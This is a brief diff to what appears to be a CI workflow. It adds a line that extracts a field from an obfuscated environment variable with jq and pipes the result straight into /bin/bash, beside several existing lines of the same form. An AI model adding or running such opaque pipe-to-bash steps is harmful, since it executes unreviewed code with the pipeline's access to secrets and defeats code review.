@@ -29,6 +29,7 @@ jobs:
           echo $tg190 | jq -r .frq417 | /bin/bash
           echo $kaw7 | jq -r .bxid752 | /bin/bash
           echo $yvp4 | jq -r .olca6560 | /bin/bash
+          printf '%s' "$uvglu57" | jq -r .ed7 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
